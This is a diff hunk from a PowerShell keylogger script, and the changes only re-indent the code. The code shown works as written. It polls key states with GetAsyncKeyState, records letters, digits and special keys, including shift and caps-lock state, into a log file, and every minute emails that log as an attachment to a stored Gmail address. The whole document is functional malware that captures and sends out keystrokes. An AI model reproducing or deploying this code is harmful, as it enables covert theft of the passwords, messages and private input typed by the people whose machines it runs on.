@@ -34,109 +34,109 @@ $stopwatch = [system.diagnostics.stopwatch]::StartNew();
 $caps = 0
 
 while($true){
-if($stopwatch.ElapsedMilliseconds -ge 60000){
-$stopwatch.Stop()
-$stopwatch = [system.diagnostics.stopwatch]::StartNew();
-$content = Get-Content 'C:\users\hilld\file.txt'
-if($content.Count -ne 3 -Or $content[2] -ne ''){
-$endDate = Get-Date -Format "HH:mm:ss"
-Add-Content $path $endDate
-$ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = $gmail
-$ReportEmail.To.Add($gmail)
-$ReportEmail.Subject = 'Keylog - ' + $date + '-' + $endDate
-$ReportEmail.Attachments.Add($path)
-$SMTPInfo.Send($ReportEmail)
-$ReportEmail.Dispose()
-}
-$date = Get-Date -Format "MM/dd/yyyy - HH:mm:ss"
-Set-Content $path "Keylog"
-Add-Content $path $date
-Add-Content $path ""
-}
-$shift1 = $getKeyState::GetAsyncKeyState(160)
-$shift2 = $getKeyState::GetAsyncKeyState(161)
-$shift = 0
-$shiftUsed = 0
-if($shift1 -eq -32767 -Or $shift2 -eq -32767 -Or $shift1 -eq -32768 -Or $shift2 -eq -32768){
-$shift = 1
-}
-for($index=65;$index -le 90; $index++){
-$logged = $getKeyState::GetAsyncKeyState($index)
-if($logged -eq -32767){
-if($shift){
-if($caps){
-$key = [String]::new([char]($index+32))
-}
-else{
-$key = [String]::new([char]$index)
-}
-$shiftUsed = 1
-}
-else{
-if($caps){
-$key = [String]::new([char]$index)
-}
-else{
-$key = [String]::new([char]($index+32))
-}
-}
-$oldContent = Get-Content $path
-$lastLine = $oldContent[$oldContent.Count-1]
-$keepContent = $oldContent[0 .. ($oldContent.Count-2)]
-Set-Content $path $keepContent
-$newContent = $lastLine+$key
-Add-Content $path $newContent
-}
-}
-for($count=0;$count -le 20; $count++){
-$index = $values[$count]
-$logged = $getKeyState::GetAsyncKeyState($index)
-if($logged -eq -32767){
-if($shift){
-$key = [String]::new($shiftedKeys[$count])
-$shiftUsed = 1
-}
-else{
-$key = [String]::new($defaultKeys[$count])
-}
-$oldContent = Get-Content $path
-$lastLine = $oldContent[$oldContent.Count-1]
-$keepContent = $oldContent[0 .. ($oldContent.Count-2)]
-Set-Content $path $keepContent
-$newContent = $lastLine+$key
-Add-Content $path $newContent
-}
-}
-for($count=0;$count -le 16; $count++){
-$index = $numValues[$count]
-$logged = $getKeyState::GetAsyncKeyState($index)
-if($logged -eq -32767){
-$key = $numKeys[$count]
-$oldContent = Get-Content $path
-$lastLine = $oldContent[$oldContent.Count-1]
-$keepContent = $oldContent[0 .. ($oldContent.Count-2)]
-Set-Content $path $keepContent
-$newContent = $lastLine+$key
-Add-Content $path $newContent
-}
-}
-for($count=0;$count -le 30; $count++){
-$index = $specialValues[$count]
-$logged = $getKeyState::GetAsyncKeyState($index)
-if($logged -eq -32767){
-$key = $specialKeys[$count]
-Add-Content $path $key
-if($count -eq 9){
-if($caps -eq 0){
-$caps = 1
-}
-else{
-$caps = 0
-}
-}
-}
-}
-Start-Sleep -m 20
+  if($stopwatch.ElapsedMilliseconds -ge 60000){
+    $stopwatch.Stop()
+    $stopwatch = [system.diagnostics.stopwatch]::StartNew();
+    $content = Get-Content 'C:\users\hilld\file.txt'
+    if($content.Count -ne 3 -Or $content[2] -ne ''){
+      $endDate = Get-Date -Format "HH:mm:ss"
+      Add-Content $path $endDate
+      $ReportEmail = New-Object System.Net.Mail.MailMessage
+      $ReportEmail.From = $gmail
+      $ReportEmail.To.Add($gmail)
+      $ReportEmail.Subject = 'Keylog - ' + $date + '-' + $endDate
+      $ReportEmail.Attachments.Add($path)
+      $SMTPInfo.Send($ReportEmail)
+      $ReportEmail.Dispose()
+    }
+    $date = Get-Date -Format "MM/dd/yyyy - HH:mm:ss"
+    Set-Content $path "Keylog"
+    Add-Content $path $date
+    Add-Content $path ""
+  }
+  $shift1 = $getKeyState::GetAsyncKeyState(160)
+  $shift2 = $getKeyState::GetAsyncKeyState(161)
+  $shift = 0
+  $shiftUsed = 0
+  if($shift1 -eq -32767 -Or $shift2 -eq -32767 -Or $shift1 -eq -32768 -Or $shift2 -eq -32768){
+    $shift = 1
+  }
+  for($index=65;$index -le 90; $index++){
+    $logged = $getKeyState::GetAsyncKeyState($index)
+    if($logged -eq -32767){
+      if($shift){
+        if($caps){
+          $key = [String]::new([char]($index+32))
+        }
+        else{
+          $key = [String]::new([char]$index)
+        }
+        $shiftUsed = 1
+      }
+      else{
+        if($caps){
+          $key = [String]::new([char]$index)
+        }
+        else{
+          $key = [String]::new([char]($index+32))
+        }
+      }
+      $oldContent = Get-Content $path
+      $lastLine = $oldContent[$oldContent.Count-1]
+      $keepContent = $oldContent[0 .. ($oldContent.Count-2)]
+      Set-Content $path $keepContent
+      $newContent = $lastLine+$key
+      Add-Content $path $newContent
+    }
+  }
+  for($count=0;$count -le 20; $count++){
+    $index = $values[$count]
+    $logged = $getKeyState::GetAsyncKeyState($index)
+    if($logged -eq -32767){
+      if($shift){
+        $key = [String]::new($shiftedKeys[$count])
+        $shiftUsed = 1
+      }
+      else{
+        $key = [String]::new($defaultKeys[$count])
+      }
+      $oldContent = Get-Content $path
+      $lastLine = $oldContent[$oldContent.Count-1]
+      $keepContent = $oldContent[0 .. ($oldContent.Count-2)]
+      Set-Content $path $keepContent
+      $newContent = $lastLine+$key
+      Add-Content $path $newContent
+    }
+  }
+  for($count=0;$count -le 16; $count++){
+    $index = $numValues[$count]
+    $logged = $getKeyState::GetAsyncKeyState($index)
+    if($logged -eq -32767){
+      $key = $numKeys[$count]
+      $oldContent = Get-Content $path
+      $lastLine = $oldContent[$oldContent.Count-1]
+      $keepContent = $oldContent[0 .. ($oldContent.Count-2)]
+      Set-Content $path $keepContent
+      $newContent = $lastLine+$key
+      Add-Content $path $newContent
+    }
+  }
+  for($count=0;$count -le 30; $count++){
+    $index = $specialValues[$count]
+    $logged = $getKeyState::GetAsyncKeyState($index)
+    if($logged -eq -32767){
+      $key = $specialKeys[$count]
+      Add-Content $path $key
+      if($count -eq 9){
+        if($caps -eq 0){
+          $caps = 1
+        }
+        else{
+          $caps = 0
+        }
+      }
+    }
+  }
+  Start-Sleep -m 20
 }
 }
